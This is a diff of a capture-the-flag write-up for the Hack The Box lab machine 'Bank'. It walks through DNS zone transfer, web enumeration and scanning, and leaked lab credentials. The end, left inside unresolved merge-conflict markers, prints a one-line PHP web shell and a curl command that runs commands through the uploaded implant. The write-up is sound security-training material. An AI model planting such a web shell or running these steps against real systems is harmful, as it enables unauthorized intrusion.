@@ -7,9 +7,10 @@ coverY: 0
 # HTB: Bank Write-Up
 
 ## Recons
+
 ### nmap
 
-Let's sniff the target machine to check if there is any opening to break in. 
+Let's sniff the target machine to check if there is any opening to break in.
 
 ```bash
 # Nmap 7.94 scan initiated Sun Nov 12 02:18:04 2023 as: nmap -vvv -Pn -sCV --open -T4 -p0-65535 -oN bank.nmap 10.10.10.29
@@ -45,39 +46,39 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 The provided Nmap scan result reveals information about a target host with the IP address 10.10.10.29. Here's a breakdown of the findings:
 
-1. **SSH Service (Port 22)**:
-   - State: Open
-   - Service: SSH (Secure Shell)
-   - Version: OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
-   - Encryption Key Types:
-     - DSA (Digital Signature Algorithm)
-     - RSA (Rivest-Shamir-Adleman)
-     - ECDSA (Elliptic Curve Digital Signature Algorithm)
-     - ED25519 (Edwards-curve Digital Signature Algorithm)
-   - Operating System: Ubuntu Linux
-   
-   This indicates that the SSH service is available on the host, allowing secure remote access. The version information can be useful for identifying potential vulnerabilities or compatibility issues.
+1.  **SSH Service (Port 22)**:
 
-2. **Domain Service (Port 53)**:
-   - State: Open
-   - Service: Domain (DNS - Domain Name System)
-   - Version: ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
-   
-   The Domain service being open suggests that this host is likely responsible for DNS resolution within the network. The version information can help in assessing potential vulnerabilities or compatibility with other DNS systems.
+    * State: Open
+    * Service: SSH (Secure Shell)
+    * Version: OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8
+    * Encryption Key Types:
+      * DSA (Digital Signature Algorithm)
+      * RSA (Rivest-Shamir-Adleman)
+      * ECDSA (Elliptic Curve Digital Signature Algorithm)
+      * ED25519 (Edwards-curve Digital Signature Algorithm)
+    * Operating System: Ubuntu Linux
 
-3. **HTTP Service (Port 80)**:
-   - State: Open
-   - Service: HTTP (Hypertext Transfer Protocol)
-   - Version: Apache httpd 2.4.7 (Ubuntu)
-   - Server Header: Apache/2.4.7 (Ubuntu)
-   - HTTP Methods Supported: POST, OPTIONS, GET, HEAD
-   - HTTP Title: Apache2 Ubuntu Default Page: It works
-   
-   The HTTP service being open indicates that the host is running a web server, serving content over the HTTP protocol. The version information can be valuable for understanding potential vulnerabilities or compatibility issues with web applications running on this server.
+    This indicates that the SSH service is available on the host, allowing secure remote access. The version information can be useful for identifying potential vulnerabilities or compatibility issues.
+2.  **Domain Service (Port 53)**:
 
+    * State: Open
+    * Service: Domain (DNS - Domain Name System)
+    * Version: ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
+
+    The Domain service being open suggests that this host is likely responsible for DNS resolution within the network. The version information can help in assessing potential vulnerabilities or compatibility with other DNS systems.
+3.  **HTTP Service (Port 80)**:
+
+    * State: Open
+    * Service: HTTP (Hypertext Transfer Protocol)
+    * Version: Apache httpd 2.4.7 (Ubuntu)
+    * Server Header: Apache/2.4.7 (Ubuntu)
+    * HTTP Methods Supported: POST, OPTIONS, GET, HEAD
+    * HTTP Title: Apache2 Ubuntu Default Page: It works
+
+    The HTTP service being open indicates that the host is running a web server, serving content over the HTTP protocol. The version information can be valuable for understanding potential vulnerabilities or compatibility issues with web applications running on this server.
 4. **Additional Information**:
-   - Latency: The host responded with a latency of 0.33 seconds, indicating a relatively quick response time.
-   - Operating System: Detected as Linux, with the Common Platform Enumeration (CPE) specifying the Linux kernel.
+   * Latency: The host responded with a latency of 0.33 seconds, indicating a relatively quick response time.
+   * Operating System: Detected as Linux, with the Common Platform Enumeration (CPE) specifying the Linux kernel.
 
 This Nmap scan provides valuable insights into the services running on the target host, allowing for further analysis and potential identification of security risks or areas of interest for further investigation.
 
@@ -85,7 +86,7 @@ This Nmap scan provides valuable insights into the services running on the targe
 
 #### dig
 
-With a standard DNS tool called 'dig' available in Linux, we can pull it off the following DNS recon on the target machine. 
+With a standard DNS tool called 'dig' available in Linux, we can pull it off the following DNS recon on the target machine.
 
 ```bash
 # get the domain's zone details with dig from dns server 
@@ -166,29 +167,23 @@ $ dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u | tr '\
 The series of commands demonstrate the process of retrieving domain zone details using the `dig` command from a DNS server, filtering the output with `grep`, `sort`, and `awk`, and finally copying the manipulated output to the clipboard using `xclip`. Here's an explanation of each step:
 
 1. **Original `dig` Command**:
-   - The initial command requests a zone transfer (`axfr`) for the domain `bank.htb` from the DNS server located at `10.10.10.29`.
-
+   * The initial command requests a zone transfer (`axfr`) for the domain `bank.htb` from the DNS server located at `10.10.10.29`.
 2. **Filtered Output with `grep`**:
-   - `grep -E '(\w+\.)?\w+\.htb'`: Filters the output to include only lines containing domain names with the `.htb` extension.
-
+   * `grep -E '(\w+\.)?\w+\.htb'`: Filters the output to include only lines containing domain names with the `.htb` extension.
 3. **Print Matches Only with `grep -o`**:
-   - `grep -oE '(\w+\.)?\w+\.htb'`: Prints only the matched domain names, one per line.
-
+   * `grep -oE '(\w+\.)?\w+\.htb'`: Prints only the matched domain names, one per line.
 4. **Sort and Print Unique Entries with `sort -u`**:
-   - `sort -u`: Sorts the domain names alphabetically and prints only unique entries.
-
+   * `sort -u`: Sorts the domain names alphabetically and prints only unique entries.
 5. **Translate Newlines to Spaces with `tr`**:
-   - `tr '\n' ' '`: Translates newline characters to spaces, combining all domain names into a single line.
-
+   * `tr '\n' ' '`: Translates newline characters to spaces, combining all domain names into a single line.
 6. **Manipulate Output with `awk`**:
-   - `awk '{print "10.10.10.29\t" $1 " " $2 " " $3 " " $4}'`: Formats the output to include the DNS server IP address (`10.10.10.29`) followed by the domain names.
-
+   * `awk '{print "10.10.10.29\t" $1 " " $2 " " $3 " " $4}'`: Formats the output to include the DNS server IP address (`10.10.10.29`) followed by the domain names.
 7. **Copy Output to Clipboard with `xclip`**:
-   - `xclip -selection clipboard`: Copies the manipulated output to the clipboard for easy pasting into other applications.
+   * `xclip -selection clipboard`: Copies the manipulated output to the clipboard for easy pasting into other applications.
 
 Overall, this series of commands provides a streamlined way to retrieve domain zone details from a DNS server, filter and manipulate the output, and then copy it to the clipboard for further use. This can be particularly useful for network administrators or security professionals conducting DNS-related investigations or audits.
 
-To make my life a bit easier and work with DNS, I add the following entry to my local Kali machine's /etc/hosts file. 
+To make my life a bit easier and work with DNS, I add the following entry to my local Kali machine's /etc/hosts file.
 
 ```bash
 $ sudo vi /etc/hosts 
@@ -196,6 +191,7 @@ $ sudo vi /etc/hosts
 ```
 
 ### Web
+
 #### WhatWeb
 
 Since the Nmap scan result shows that the TCP port 80 HTTP is opening, I would like to confirm its operating system and version.
@@ -208,25 +204,19 @@ http://10.10.10.29 [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubu
 It is a command-line tool called WhatWeb, which is used for web fingerprinting or identifying the technologies used by a website. Here's an analysis of the output:
 
 1. **URL**: http://10.10.10.29
-   - This is the URL of the target website being analyzed.
-
-2. **Response Status**: [200 OK]
-   - Indicates that the web server responded with a successful HTTP status code, meaning the request was processed without errors.
-
-3. **Web Server**: Apache [2.4.7]
-   - Specifies the web server software being used, which in this case is Apache version 2.4.7. Apache is a widely used open-source web server software.
-
-4. **Country**: RESERVED [ZZ]
-   - The country field typically provides information about the geographical location of the server based on its IP address. However, in this case, it shows "RESERVED" with the country code "ZZ", which suggests that the country information is not available or reserved.
-
-5. **HTTP Server**: Ubuntu Linux [Apache/2.4.7 (Ubuntu)]
-   - Indicates the underlying operating system and its version, which is Ubuntu Linux. Additionally, it mentions that Apache version 2.4.7 is specifically configured for Ubuntu.
-
+   * This is the URL of the target website being analyzed.
+2. **Response Status**: \[200 OK]
+   * Indicates that the web server responded with a successful HTTP status code, meaning the request was processed without errors.
+3. **Web Server**: Apache \[2.4.7]
+   * Specifies the web server software being used, which in this case is Apache version 2.4.7. Apache is a widely used open-source web server software.
+4. **Country**: RESERVED \[ZZ]
+   * The country field typically provides information about the geographical location of the server based on its IP address. However, in this case, it shows "RESERVED" with the country code "ZZ", which suggests that the country information is not available or reserved.
+5. **HTTP Server**: Ubuntu Linux \[Apache/2.4.7 (Ubuntu)]
+   * Indicates the underlying operating system and its version, which is Ubuntu Linux. Additionally, it mentions that Apache version 2.4.7 is specifically configured for Ubuntu.
 6. **IP Address**: 10.10.10.29
-   - Specifies the IP address of the target server.
-
+   * Specifies the IP address of the target server.
 7. **Title**: Apache2 Ubuntu Default Page: It works
-   - Provides the title of the webpage, which is the default page served by Apache on an Ubuntu system. This is often displayed when no specific content is configured for the root URL of the web server.
+   * Provides the title of the webpage, which is the default page served by Apache on an Ubuntu system. This is often displayed when no specific content is configured for the root URL of the web server.
 
 WhatWeb analysis reveals that the target website is hosted on a server running Apache version 2.4.7 on Ubuntu Linux. The default page for Apache on Ubuntu is being served, indicating that the web server is operational and accessible.
 
@@ -309,41 +299,48 @@ $ firefox aquatone_report.html&
 
 It illustrates the process of using Aquatone, a reconnaissance tool, to capture screenshots and generate reports for a list of domain URLs. Here's a breakdown of each step:
 
-1. **Download Aquatone**:
-   - Fetches the Aquatone release from GitHub using `wget`.
-   ```
-   wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
-   ```
+1.  **Download Aquatone**:
 
-2. **Unzip Aquatone**:
-   - Extracts the downloaded Aquatone zip file using `unzip`.
-   ```
-   unzip aquatone_linux_amd64_1.7.0.zip
-   ```
+    * Fetches the Aquatone release from GitHub using `wget`.
 
-3. **Retrieve Domain URLs with `dig`**:
-   - Performs a zone transfer for the domain `bank.htb` from the DNS server at `10.10.10.29`, filters and sorts unique domain names, and saves them to a file named `bank.urls`.
-   ```
-   dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u > bank.urls
-   ```
+    ```
+    wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
+    ```
+2.  **Unzip Aquatone**:
 
-4. **Prepend `http://` to URLs with `sed`**:
-   - Adds `http://` prefix to each line in `bank.urls`.
-   ```
-   sed -i 's/^/http:\/\//gi' bank.urls
-   ```
+    * Extracts the downloaded Aquatone zip file using `unzip`.
 
-5. **Feed URLs to Aquatone**:
-   - Pipes the contents of `bank.urls` to Aquatone for scanning.
-   ```
-   cat bank.urls | ./aquatone
-   ```
+    ```
+    unzip aquatone_linux_amd64_1.7.0.zip
+    ```
+3.  **Retrieve Domain URLs with `dig`**:
 
-6. **Open Aquatone HTML Report**:
-   - Opens the generated HTML report in a web browser (Firefox) for review.
-   ```
-   firefox aquatone_report.html&
-   ```
+    * Performs a zone transfer for the domain `bank.htb` from the DNS server at `10.10.10.29`, filters and sorts unique domain names, and saves them to a file named `bank.urls`.
+
+    ```
+    dig @10.10.10.29 bank.htb axfr | grep -oE '(\w+\.)?\w+\.htb' | sort -u > bank.urls
+    ```
+4.  **Prepend `http://` to URLs with `sed`**:
+
+    * Adds `http://` prefix to each line in `bank.urls`.
+
+    ```
+    sed -i 's/^/http:\/\//gi' bank.urls
+    ```
+5.  **Feed URLs to Aquatone**:
+
+    * Pipes the contents of `bank.urls` to Aquatone for scanning.
+
+    ```
+    cat bank.urls | ./aquatone
+    ```
+6.  **Open Aquatone HTML Report**:
+
+    * Opens the generated HTML report in a web browser (Firefox) for review.
+
+    ```
+    firefox aquatone_report.html&
+    ```
 
 These commands demonstrate a streamlined process for using Aquatone to perform reconnaissance on a list of domain URLs, capturing screenshots and generating reports for further analysis.
 
@@ -380,25 +377,23 @@ Finished
 The output displays the results of a web scan conducted with Gobuster, a popular directory and file brute-forcing tool. Here's an explanation of the scan:
 
 1. **Tool Information**:
-   - Gobuster version 3.6 is being used for the scan. Gobuster is a tool used to brute-force: URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Open Amazon S3 buckets, Open Google Cloud buckets and TFTP servers. Gobuster is useful for pentesters, ethical hackers and forensics experts. It also can be used for security tests.
-
+   * Gobuster version 3.6 is being used for the scan. Gobuster is a tool used to brute-force: URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Open Amazon S3 buckets, Open Google Cloud buckets and TFTP servers. Gobuster is useful for pentesters, ethical hackers and forensics experts. It also can be used for security tests.
 2. **Scan Configuration**:
-   - **URL**: http://bank.htb
-   - **Method**: GET
-   - **Threads**: 100
-   - **Wordlist**: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-   - **Negative Status codes**: 404 (ignore 404 Not Found responses)
-   - **User Agent**: gobuster/3.6
-   - **Timeout**: 10 seconds
-
+   * **URL**: http://bank.htb
+   * **Method**: GET
+   * **Threads**: 100
+   * **Wordlist**: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+   * **Negative Status codes**: 404 (ignore 404 Not Found responses)
+   * **User Agent**: gobuster/3.6
+   * **Timeout**: 10 seconds
 3. **Results**:
-   - The scan is performed in directory enumeration mode.
-   - Directories or paths found during the scan:
-     - **/uploads**: Redirects to http://bank.htb/uploads/
-     - **/assets**: Redirects to http://bank.htb/assets/
-     - **/inc**: Redirects to http://bank.htb/inc/
-     - **/server-status**: Access forbidden (Status: 403 Forbidden)
-     - **/balance-transfer**: Redirects to http://bank.htb/balance-transfer/
+   * The scan is performed in directory enumeration mode.
+   * Directories or paths found during the scan:
+     * **/uploads**: Redirects to http://bank.htb/uploads/
+     * **/assets**: Redirects to http://bank.htb/assets/
+     * **/inc**: Redirects to http://bank.htb/inc/
+     * **/server-status**: Access forbidden (Status: 403 Forbidden)
+     * **/balance-transfer**: Redirects to http://bank.htb/balance-transfer/
 
 Gobuster successfully identified several directories and paths on the target website http://bank.htb, along with their corresponding status codes and sizes. This information can be valuable for further reconnaissance and vulnerability assessment, allowing security professionals to explore potentially sensitive areas of the web application. Additionally, the presence of directories like "uploads," "assets," and "balance-transfer" may provide avenues for further investigation or exploitation.
 
@@ -512,28 +507,23 @@ p
 The command executes a scan using Nuclei against the target URLs listed in `bank.urls`. Here's a breakdown of the process and the findings:
 
 1. **Nuclei Installation and Version Check**:
-   - Nuclei-templates are installed, and the current version of Nuclei (`v3.0.2`) and the loaded templates (`v9.6.9`) are displayed.
-
+   * Nuclei-templates are installed, and the current version of Nuclei (`v3.0.2`) and the loaded templates (`v9.6.9`) are displayed.
 2. **Template Execution**:
-   - Nuclei executes a total of 7278 templates for the scan, comprising both signed and unsigned templates.
-   - The templates are clustered to reduce the number of requests, resulting in 1252 clusters and 4876 reduced requests.
-
+   * Nuclei executes a total of 7278 templates for the scan, comprising both signed and unsigned templates.
+   * The templates are clustered to reduce the number of requests, resulting in 1252 clusters and 4876 reduced requests.
 3. **Targets Loaded and Interactsh Server**:
-   - Four targets are loaded for the current scan, which correspond to the URLs listed in `bank.urls`.
-   - Nuclei utilizes an Interactsh Server at `oast.live` during the scan.
-
+   * Four targets are loaded for the current scan, which correspond to the URLs listed in `bank.urls`.
+   * Nuclei utilizes an Interactsh Server at `oast.live` during the scan.
 4. **Detection of HTTP Methods and Web Servers**:
-   - Nuclei identifies various HTTP methods supported by the target URLs, such as POST, OPTIONS, GET, and HEAD.
-   - Detection of web servers reveals that the targets are running Apache/2.4.7 on Ubuntu.
-
+   * Nuclei identifies various HTTP methods supported by the target URLs, such as POST, OPTIONS, GET, and HEAD.
+   * Detection of web servers reveals that the targets are running Apache/2.4.7 on Ubuntu.
 5. **Identification of Vulnerabilities and Misconfigurations**:
-   - Nuclei detects several vulnerabilities and misconfigurations across the target URLs, including:
-     - Missing security headers like `X-Frame-Options`, `Content-Security-Policy`, and `Strict-Transport-Security`.
-     - Exposure of sensitive files like `WEB-INF/web.xml`, potentially indicating information disclosure vulnerabilities (e.g., CVE-2021-28164).
-     - Detection of weak SSH configurations, including password authentication and supported authentication methods.
-
+   * Nuclei detects several vulnerabilities and misconfigurations across the target URLs, including:
+     * Missing security headers like `X-Frame-Options`, `Content-Security-Policy`, and `Strict-Transport-Security`.
+     * Exposure of sensitive files like `WEB-INF/web.xml`, potentially indicating information disclosure vulnerabilities (e.g., CVE-2021-28164).
+     * Detection of weak SSH configurations, including password authentication and supported authentication methods.
 6. **Additional Observations**:
-   - Nuclei skips some target URLs (`www.bank.htb`, `ns.bank.htb`, `chris.bank.htb`, `bank.htb`) due to unresponsiveness after multiple attempts.
+   * Nuclei skips some target URLs (`www.bank.htb`, `ns.bank.htb`, `chris.bank.htb`, `bank.htb`) due to unresponsiveness after multiple attempts.
 
 The scan provides valuable insights into potential security issues and vulnerabilities present in the target URLs. These findings can aid in securing the web applications and network infrastructure against various threats and attacks. Nuclei proves to be a versatile and effective tool for security scanning, offering comprehensive coverage of web and network security assessment.
 
@@ -627,48 +617,44 @@ chris@bank.htb:!##HTBB4nkP4ssw0rd!##
 It's a series of actions against the target URL `http://bank.htb/balance-transfer`. Let's break down each step:
 
 1. **Counting Files Ending with `.acc`**:
-   - It uses `curl` to fetch the HTML content from the specified URL.
-   - `grep` is used to filter lines containing `.acc` case-insensitively.
-   - `wc -l` counts the number of lines, which corresponds to the number of files ending with `.acc`.
-   - Result: 999 files ending with `.acc`.
-
+   * It uses `curl` to fetch the HTML content from the specified URL.
+   * `grep` is used to filter lines containing `.acc` case-insensitively.
+   * `wc -l` counts the number of lines, which corresponds to the number of files ending with `.acc`.
+   * Result: 999 files ending with `.acc`.
 2. **Counting Files Not Ending with `.acc`**:
-   - Similar to the previous step, but this time `grep -iv` is used to exclude lines containing `.acc`.
-   - Result: 15 files not ending with `.acc`.
-
+   * Similar to the previous step, but this time `grep -iv` is used to exclude lines containing `.acc`.
+   * Result: 15 files not ending with `.acc`.
 3. **Listing Files and Their Sizes**:
-   - The script fetches the content, extracts file names and sizes, and sorts them by size.
-   - It uses a combination of `grep`, `cut`, `tr`, `sort`, and `head`.
-   - The output lists the first 10 files sorted by size, showing their names and sizes.
-
+   * The script fetches the content, extracts file names and sizes, and sorts them by size.
+   * It uses a combination of `grep`, `cut`, `tr`, `sort`, and `head`.
+   * The output lists the first 10 files sorted by size, showing their names and sizes.
 4. **Statistics on Byte Sizes**:
-   - It retrieves file sizes, counts their occurrences, and sorts them.
-   - `grep`, `cut`, `tr`, `sort`, and `uniq -c` are used.
-   - The output displays the count of files for each unique byte size.
-
+   * It retrieves file sizes, counts their occurrences, and sorts them.
+   * `grep`, `cut`, `tr`, `sort`, and `uniq -c` are used.
+   * The output displays the count of files for each unique byte size.
 5. **Retrieving a Specific File**:
-   - It fetches the content, identifies files with a size of 257 bytes, and displays their names.
-   - The output reveals a single file with the specified size.
-
+   * It fetches the content, identifies files with a size of 257 bytes, and displays their names.
+   * The output reveals a single file with the specified size.
 6. **Viewing the Content of the File**:
-   - The script fetches the content of the file `68576f20e9732f1b2edc4df5b8533230.acc`.
-   - The content includes sensitive information like full name, email, password, credit card count, transactions count, and balance.
-
+   * The script fetches the content of the file `68576f20e9732f1b2edc4df5b8533230.acc`.
+   * The content includes sensitive information like full name, email, password, credit card count, transactions count, and balance.
 7. **Recording the Credentials**:
-   - It records the credentials (`chris@bank.htb: !##HTBB4nkP4ssw0rd!##`) in a file named `creds.txt`.
-
+   * It records the credentials (`chris@bank.htb: !##HTBB4nkP4ssw0rd!##`) in a file named `creds.txt`.
 8. **Logging in to the Account**:
-   - It suggests logging in to the account using the obtained credentials.
-   - After successful login, it advises looking for the place to upload files, as there is a directory for uploads.
-
+   * It suggests logging in to the account using the obtained credentials.
+   * After successful login, it advises looking for the place to upload files, as there is a directory for uploads.
 9. **Crafting a Request for File Upload**:
-   - It provides instructions for crafting a request to upload a file with PHP code execution inside a PNG file.
-
+   * It provides instructions for crafting a request to upload a file with PHP code execution inside a PNG file.
 10. **Source Code Inspection**:
-    - It suggests inspecting the source code of `bank.htb/support.php` and mentions a debug block added for executing `.htb` files as PHP for debugging purposes.
+    * It suggests inspecting the source code of `bank.htb/support.php` and mentions a debug block added for executing `.htb` files as PHP for debugging purposes.
+
+<figure><img src="../.gitbook/assets/Pasted image 20231114075605.png" alt=""><figcaption><p>Burp Suite - Repeater</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/Pasted image 20231114075643.png" alt=""><figcaption><p>Remote Code Execution - RCE</p></figcaption></figure>
 
 It demonstrates a systematic approach to exploring and interacting with a web application, including enumeration of files, extraction of sensitive information, and identification of potential vulnerabilities for further exploitation.
 
+<<<<<<< HEAD
 ```bash
 # or you can simply create the implant.png.htb with the following php code 
 <?php system($_REQUEST["cmd"]); ?>
@@ -680,5 +666,6 @@ www-data
 $ curl http://bank.htb/uploads/implant.png.htb --data-urlencode 'cmd=whoami'
 www-data
 ```
+=======
+>>>>>>> origin/master
 ## Exploits
-
